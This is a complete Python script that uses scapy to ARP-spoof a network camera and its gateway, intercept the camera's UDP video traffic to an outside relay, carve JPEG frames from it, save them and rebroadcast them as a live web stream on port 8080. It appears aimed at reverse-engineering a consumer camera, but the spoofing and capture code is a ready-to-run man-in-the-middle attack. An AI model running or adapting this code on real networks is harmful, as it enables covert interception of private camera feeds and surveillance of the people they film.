#!/usr/bin/env python3
"""
Direct JPEG extraction from camera relay traffic via scapy + ARP spoof.
"""
from scapy.all import *
import threading, time, os

CAM_IP = "192.168.1.148"
RELAY_IP = "49.237.71.144"
OUTPUT_DIR = r"E:\open_camera\apk_analysis\frames"
os.makedirs(OUTPUT_DIR, exist_ok=True)

MY_MAC = "9c:6b:00:cf:27:e7"
running = True
frame_count = 0
latest_frame = b''
lock = threading.Lock()

def spoof():
    conf.verb = 0
    cam = getmacbyip(CAM_IP) or "ff:ff:ff:ff:ff:ff"
    gw = getmacbyip("192.168.1.1") or "ff:ff:ff:ff:ff:ff"
    p1 = Ether(dst=cam)/ARP(op=2, pdst=CAM_IP, hwdst=cam, psrc="192.168.1.1", hwsrc=MY_MAC)
    p2 = Ether(dst=gw)/ARP(op=2, pdst="192.168.1.1", hwdst=gw, psrc=CAM_IP, hwsrc=MY_MAC)
    while running:
        sendp(p1, iface=conf.iface, verbose=False)
        sendp(p2, iface=conf.iface, verbose=False)
        time.sleep(0.8)

def handle(pkt):
    global frame_count, latest_frame
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP)): return
    if pkt[IP].src != CAM_IP: return
    if pkt[IP].dst != RELAY_IP: return
    if pkt[UDP].dport != 22036: return
    
    payload = bytes(pkt[UDP].payload)
    if len(payload) < 200: return
    
    for i in range(len(payload) - 4):
        if payload[i:i+3] == b'\xff\xd8\xff':
            for j in range(len(payload) - 2, i + 400, -1):
                if payload[j:j+2] == b'\xff\xd9':
                    jpeg = payload[i:j+2]
                    if len(jpeg) > 500:
                        frame_count += 1
                        fname = os.path.join(OUTPUT_DIR, f"frame_{frame_count:05d}.jpg")
                        with open(fname, 'wb') as f:
                            f.write(jpeg)
                        with lock:
                            latest_frame = jpeg
                        if frame_count % 10 == 0:
                            print(f"[{frame_count}] {len(jpeg)}b")
                        return
                    break
            break

def http_server():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/cam.mjpg':
                self.send_response(200)
                self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=FRAME')
                self.end_headers()
                last = 0
                while running:
                    global frame_count, latest_frame
                    if frame_count > last and latest_frame:
                        self.wfile.write(b'--FRAME\r\nContent-Type: image/jpeg\r\n')
                        self.wfile.write(f'Content-Length: {len(latest_frame)}\r\n\r\n'.encode())
                        self.wfile.write(latest_frame)
                        self.wfile.write(b'\r\n')
                        last = frame_count
                    time.sleep(0.05)
            elif self.path == '/':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><body><h1>Camera</h1><img src="/cam.mjpg" style="max-width:100%"><p>Frames: {frame_count}</p></body></html>'.encode())
    
    server = HTTPServer(('0.0.0.0', 8080), H)
    print("[HTTP] http://localhost:8080")
    server.serve_forever()

print(f"Camera: {CAM_IP} -> Relay: {RELAY_IP}:22036")
print(f"Frames: {OUTPUT_DIR}")

threading.Thread(target=spoof, daemon=True).start()
threading.Thread(target=http_server, daemon=True).start()
time.sleep(1)
print("[*] Ready - open 365Cam app to start streaming!")

try:
    sniff(filter=f"host {CAM_IP} and host {RELAY_IP}", prn=handle, store=False)
except KeyboardInterrupt:
    pass
finally:
    running = False
    print(f"\nDone. {frame_count} frames saved")
